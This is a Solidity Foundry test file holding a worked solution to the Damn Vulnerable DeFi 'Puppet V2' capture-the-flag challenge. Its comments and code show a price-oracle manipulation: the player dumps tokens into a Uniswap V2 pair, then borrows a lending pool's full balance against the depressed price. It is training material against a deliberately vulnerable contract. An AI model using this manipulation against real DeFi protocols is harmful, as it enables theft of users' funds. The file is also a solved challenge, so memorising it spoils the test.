// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * The vulnerability is still price oracle manipulation, but now targeting a Uniswap V2 pool.
     * While Uniswap V2's price mechanism based on reserves is more complex than Uniswap V1's,
     * it's still susceptible to large trades that shift the reserves and thus the reported price.
     *
     * The PuppetV2Pool's oracle (_getOracleQuote) uses UniswapV2Library.getReserves() to fetch the current reserves
     * of the WETH/DVT pair and then UniswapV2Library.quote() to calculate the price based on these reserves.
     *
     * An attacker can:
     * 1. Perform a large swap on the Uniswap V2 pair (specifically, sell DVT for WETH).
     * 2. This swap will increase the WETH reserve and decrease the DVT reserve in the Uniswap V2 pool.
     * 3. As a result, the price of DVT, as calculated by _getOracleQuote, will temporarily decrease because the ratio (WETH reserve) / (DVT reserve) becomes smaller.
     * 4. Immediately after this price manipulation, the attacker calls lendingPool.borrow(). Because the oracle now reports a lower DVT price, the calculateDepositOfWETHRequired() function will calculate a much lower WETH deposit requirement.
     * 5. The attacker can then borrow a large amount of DVT by depositing a significantly smaller amount of WETH than would be required under normal market conditions.
     */
    function test_puppetV2() public checkSolvedByPlayer {
        // The player approves the Uniswap V2 router to spend their entire DVT token balance. This allows the player to sell DVT on Uniswap.
        token.approve(address(uniswapV2Router), type(uint256).max);
        // Sets up a path array for the Uniswap V2 swap. This path indicates a direct swap from token (DVT) to weth.
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        // Logs the deposit requirement before price manipulation
        console.log(
            "before calculateDepositOfWETHRequired",
            lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        );
        // Price Manipulation Step!
        // By selling a large amount of DVT, the player significantly increases the supply of DVT in the WETH/DVT pool and decreases the WETH supply. This pushes the price of DVT down in the pool.
        uniswapV2Router.swapExactTokensForETH( // Calls the Uniswap V2 router's function to swap an exact amount of tokens for ETH
            token.balanceOf(player), // The player sells all of their DVT tokens
            1 ether, // Specifies a minimum amount of WETH to receive. This is set to a small value to ensure the swap goes through even with significant price impact. The primary goal is price manipulation, not maximizing ETH gain
            path, // The swap path (DVT -> WETH)
            player, //  The WETH received from the swap is sent back to the player.
            block.timestamp // deadline
        );
        // Converts all of the player's ETH balance into WETH. The player received WETH from the swap in the previous step, and might have had some initial ETH. This ensures the player has WETH to deposit as collateral.
        weth.deposit{value: player.balance}();
        // The player approves the PuppetV2Pool to spend their entire WETH balance. This is necessary for the borrow() function to transferFrom WETH.
        weth.approve(address(lendingPool), type(uint256).max);
        // Logs the deposit requirement after price manipulation. You'll see this value is significantly lower than before.
        console.log(
            "after calculateDepositOfWETHRequired",
            lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        );
        // The player attempts to borrow all the DVT tokens from the lending pool (1,000,000 DVT). Because of the price manipulation, the required WETH deposit will be low enough for the player to afford.
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        // Transfers all the borrowed DVT tokens to the recovery address
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
